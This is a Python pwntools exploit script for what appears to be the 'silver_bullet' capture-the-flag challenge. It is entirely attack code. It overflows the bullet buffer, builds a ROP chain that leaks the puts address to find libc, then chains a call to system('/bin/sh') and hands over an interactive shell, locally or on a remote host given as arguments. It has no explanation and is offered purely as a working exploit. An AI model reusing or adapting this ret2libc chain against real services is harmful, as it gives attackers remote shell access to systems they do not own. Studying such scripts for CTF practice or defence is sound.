from pwn import *
if args.REMOTE:
    io = remote(sys.argv[1],sys.argv[2])
else:
    io = process("./silver_bullet_patched", )
elf = context.binary = ELF("./silver_bullet_patched", checksec=False)


libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")


offset = 7



io.recvuntil(b'Your choice :')
io.sendline(b'1')
io.recvuntil(b'bullet :')
io.sendline(b'A'*47)


io.recvuntil(b'Your choice :')
io.sendline(b'2')
io.recvuntil(b'bullet :')
io.sendline(b'A')

rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')


payload = b'A'*7 + rop.chain()

io.recvuntil(b'Your choice :')
io.sendline(b'2')
io.recvuntil(b'bullet :')
io.sendline(payload)
io.recvuntil(b'Your choice :')
io.sendline(b'3')
io.recvuntil(b'Your choice :')
io.sendline(b'3')

io.recvuntil(b'Oh ! You win !!')
io.recvline()

leaked = unpack(io.recv(4))
print(f'Leaked Puts: {hex(leaked)}')

libc.address = leaked - libc.sym['puts']

print(f'Libc Base: {hex(libc.address)}')

finalRop = ROP(libc)
finalRop.system(next(libc.search(b'/bin/sh\x00')))

payload = finalRop.chain()

io.recvuntil(b'Your choice :')
io.sendline(b'1')
io.recvuntil(b'bullet :')
io.sendline(b'A'*47)


io.recvuntil(b'Your choice :')
io.sendline(b'2')
io.recvuntil(b'bullet :')
io.sendline(b'A')

payload = b'A'*7 + payload

io.recvuntil(b'Your choice :')
io.sendline(b'2')
io.recvuntil(b'bullet :')
io.sendline(payload)
io.recvuntil(b'Your choice :')
io.sendline(b'3')
io.recvuntil(b'Your choice :')
io.sendline(b'3')

io.interactive()